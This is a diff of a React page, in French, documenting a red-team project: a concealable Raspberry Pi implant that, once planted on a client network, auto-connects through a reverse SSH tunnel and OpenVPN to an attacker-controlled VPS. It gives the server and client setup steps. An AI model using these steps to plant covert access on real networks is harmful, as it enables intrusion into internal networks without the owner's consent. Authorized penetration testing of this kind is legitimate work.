@@ -22,7 +22,7 @@ class Redteam extends React.Component {
         <img id="hacktheplanet" src={HackThePlanet} alt="hack the planet"></img>
 
         <h2>Contexte</h2>
-        <p className="tabulation">Notre projet consiste à créer un implant qu'il suffira de déposer chez un client pour avoir un accès à distance au réseau interne. Cela représente la phase de compromission initiale dans le schéma de redteam suivant: <br/>
+        <p className="tabulation">Notre projet consiste à créer un implant qu'il suffira de déposer chez un client pour avoir un accès à distance au réseau interne. Cela représente la phase de compromission initiale dans le schéma suivant: <br/>
 
         <img id="methodoredteam" src={Methodo} alt="méthodologie redteam"/>
         <br/>  
@@ -41,7 +41,7 @@ class Redteam extends React.Component {
         Plusieurs appareils peuvent convenir, les critères principaux étant sa fiabilité, sa légèreté, sa taille, sa rapidité et son coût:
             <ul>
                 <li>l'appareil doit être <strong>petit</strong> (facile à dissimuler)</li>
-                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et/ou <strong>OpenVPN</strong> pour le serveur de contrôle</li>
+                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et <strong>OpenVPN</strong></li>
                 <li>espace de <strong>stockage</strong> (au moins 32 Go)</li>
                 <li>matériel <strong>rapide</strong></li>
                 <li><strong>faible coût</strong> (en cas de destruction ou de vol)</li>
@@ -258,9 +258,7 @@ class Redteam extends React.Component {
         ssh-keygen (laisser les paramètres par défaut) 
         </div>
 
-
         <div id="wifi">scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/</div>
-
 
         <strong>[Sur le serveur]</strong><br/>
         Ajouter le contenu id_rsa.pub à ~/.ssh/authorized_keys ou bien créer ce fichier:<br/>
@@ -315,72 +313,54 @@ class Redteam extends React.Component {
         </p>
 
         <ol>
-          <li>Allez sur <a href="https://aws.amazon.com/lightsail/">Lien VPS amazon</a>, se connecter puis créer un nouveau VPS</li>
+          <li>Allez sur <a href="https://aws.amazon.com/lightsail/">Lien VPS amazon</a>, se connecter puis créer une nouvelle instance de VPS (OS Ubuntu)</li>
 
-          Une fois crée, Manage -> Networking
+          Une fois crée, Manage -> Networking, ajoutez 2 règles firewall sur les ports (443 et 943)
 
-          Ajoutez 2 règles firewall sur les ports (443 et 943)
-
-          <li>Installez un OS (par exemple Ubuntu). Faire un chmod 600 de la SSH key et se connectez sur le VPS server à partir de la machine d'attaque : </li>
-          ssh -i LightsailDefaultPrivateKey-us-west-2.pem user@[IP] <br/>
-          sudo su -
-          <li>mettre à jour le serveur:</li>
           <li>Installez OpenVPN AS</li>
-          <p>apt update && apt -y install ca-certificates wget net-tools <br/>
-            wget -qO - https://as-repository.openvpn.net/as-repo-public.gpg | apt-key add - <br/>
-            echo "deb http://as-repository.openvpn.net/as/debian bionic main">/etc/apt/sources.list.d/openvpn-as-repo.list <br/>
-            apt update && apt -y install openvpn-as <br/>
+          <p id="wifi" style={{'text-align':'left'}}># apt update && apt -y install ca-certificates wget net-tools <br/>
+            # wget -qO - https://as-repository.openvpn.net/as-repo-public.gpg | apt-key add - <br/>
+            # echo "deb http://as-repository.openvpn.net/as/debian bionic main">/etc/apt/sources.list.d/openvpn-as-repo.list <br/>
+            # apt update && apt -y install openvpn-as <br/>
           </p>
 
-      
-          <li>Supprimez le profil actuel et configurez OpenVPN:</li>
-          /usr/local/openvpn_as/bin/ovpn-init
+          <li>Supprimez le profil actuel et configurez OpenVPN:  <strong>/usr/local/openvpn_as/bin/ovpn-init</strong></li>
           <li>Tapez DELETE: (sensible à la casse)</li>
-          <li>Finir l'installation comme suit</li>
+          <li>Finir l'installation comme suit :</li>
         </ol>
-        <p>Accept EULA: yes <br/>
+        <p id="wifi">Accept EULA: yes <br/>
           Will this be the primary Access Server node: yes <br/>
           Please specify the network interface and IP address to be <br/>
           used by the Admin Web UI: <br/>
           (1) all interfaces: 0.0.0.0 <br/>
           (2) eth0: 45.77.217.54 <br/>
-          Answer: 1 <br/>
+          Réponse: 1 <br/>
           Please specify the port number for the Admin Web UI. <br/>
-          Answer: 943 <br/>
+          Réponse: 943 <br/>
           Please specify the TCP port number for the OpenVPN Daemon <br/>
-          Answer: 443 <br/>
+          Réponse: 443 <br/>
           Should client traffic be routed by default through the VPN? <br/>
-          Answer: YES <br/>
+          Réponse: YES <br/>
           Should client DNS traffic be routed by default through the VPN? <br/>
-          Answer: YES <br/>
+          Réponse: YES <br/>
           Use local authentication via internal DB? <br/>
           > Press ENTER for default [no]:  <br/>
-          Answer: YES <br/>
-          The rest of these answers should be default. Simply hit the 'Enter' key <br/>
-          
-          passwd openvpn <br/>
-          At the prompt, set a password for the user openvpn.<br/>
-
-          Connect to the admin page and login using the openvpn user with the new password.<br/>
-
-          https://server-ip:943/admin/<br/>
+          Réponse: YES <br/>
+          Pour toute la suite sélectionnez les réponses par défaut (tapez juste 'Enter') <br/>
           </p>
 
-          <br/>
+          <p>passwd openvpn <br/>
+          Changez le mot de passe pour l'utilisateur openvpn.<br/></p>
+    
 
           <h3>Configuration de OpenVPN AS Server</h3>
           <ol>
-            <li>Allez sur https://[IP Address du serveur VPS]:943/admin/</li>
-            <li>Se connecter avec le compte "openvpn" et le mot de passe récemment crée <br/>
-            Note: Si vous utilisez AWS Lightsail, assurez-vous dans les paramètres que le nom d'hôte ou l'adresse IP est l'adresse IP publique et non la privée, puis enregistrez et mettez à jour.</li>
-            <li>Dans OpenVPN, vérifiez que l'authentification est définie sur locale: <br/>
-            Authentication -> General -> Set to Local (On) -> Save Settings -> Update Server</li>
-            <li>Allez sur User Management -> User Permissions<br/>
-            Créez un utilisateur : redteam et activez l'option<br/>
-            Set AllowAuto-login</li>
-            <li>Activez les autorisations de l'utilisateur: -> More settings<br/>
-            All server-side private subnets<br/>
-            All other VPN clients</li>
+            <li>Allez sur https://[IP_Serveur_VPS]:943/admin/</li>
+            <li>Se connecter avec le compte <strong>openvpn</strong> et le mot de passe précédemment crée.</li>
+            <li>Authentication -> General -> Set to Local (On) -> Save Settings -> Update Server</li>
+            <li>User Management -> User Permissions, créez un utilisateur <strong>redteam</strong> avec l'option <strong>Set AllowAuto-login</strong></li>
+            <li>-> More settings, activez les autorisations : <br/><strong>All server-side private subnets</strong><br/>
+            <strong>All other VPN clients</strong></li>
           </ol>
 
           <br/>
@@ -394,18 +374,19 @@ class Redteam extends React.Component {
           <br/>
 
           <h3>Configuration de la Raspberry Pi 4</h3>
-          <li>Allumez la Raspberry Pi 4 et branchez un câble ethernet</li>
-          <li>Configurez le démarrage automatique de OpenVPN dans le fichier :<br/>
-          nano /etc/default/openvpn <br/>
-          [Décommentez ‘AUTOSTART=”all”’]</li>
-          <li>Copiez client.ovpn sur la Raspberry dans /etc/openvpn/</li>
-          <li>Renommez le en client.conf</li>
-          <li>Activez OpenVPN pour démarrer au boot: <br/>update-rc.d openvpn enable</li>
-          <li>Puis reboot</li>
-
-          <p className="tabulation">Cela va lancer le client OpenVPN sur la Raspberry. Pour vous assurer que cela fonctionne, retournez dans votre serveur OpenVPN AS et vérifiez les connexions. Accédez à "Utilisateurs actuels" dans le menu État et vous devriez voir le nom d'utilisateur "redteam" avec l'adresse réelle comme adresse WAN externe de l'endroit où la Raspberry Pi 4 est branchée et une adresse VPN. <br/><br/>
+          <li>Allumez la Raspberry et branchez un câble ethernet</li>
+          <li>Configurez le démarrage automatique d'OpenVPN :<br/>
+          <strong>vim /etc/default/openvpn</strong> et décommentez <strong>[‘AUTOSTART=”all”’]</strong></li>
+          <li>Copiez <strong>client.ovpn</strong> sur la Raspberry dans <strong>/etc/openvpn/</strong></li>
+          <li>Renommez le en <strong>client.conf</strong></li>
+          <li>Activez OpenVPN pour démarrer au boot: <strong>update-rc.d openvpn enable</strong></li>
+          <li>Reboot</li>
           
-          Nous avons à présent la Raspberry Pi 4 configurée de sorte que dès lors qu'elle se connecte à un réseau, elle va chercher à se reconnecter à notre serveur VPN.</p>
+          <br/>
+
+          <p className="tabulation">Dans le serveur OpenVPN AS, Connexions -> Utilisateurs actuels, on voit apparaître l'utilisateur <strong>redteam</strong> avec l'adresse réelle de l'endroit où la Raspberry est branchée et une adresse VPN. <br/><br/>
+          
+          Nous avons à présent la Raspberry configurée pour se reconnecter à notre serveur VPN dès qu'elle est connectée à un réseau.</p>
 
           <br/>
 
